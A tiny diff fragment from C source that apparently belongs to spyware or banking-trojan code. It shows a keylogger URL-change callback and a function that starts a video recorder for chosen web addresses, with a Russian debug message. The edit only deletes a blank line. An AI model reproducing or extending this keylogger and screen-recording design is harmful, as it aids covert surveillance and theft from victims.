@@ -434,7 +434,6 @@ void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
 
 void StartVideoFromCurrentURL()
 {
-
 	#ifdef UniversalKeyLoggerH
  		VDRDBG("VideoRecorder", "Инициализируем видеорекордер для записи при нужных адресах");
 
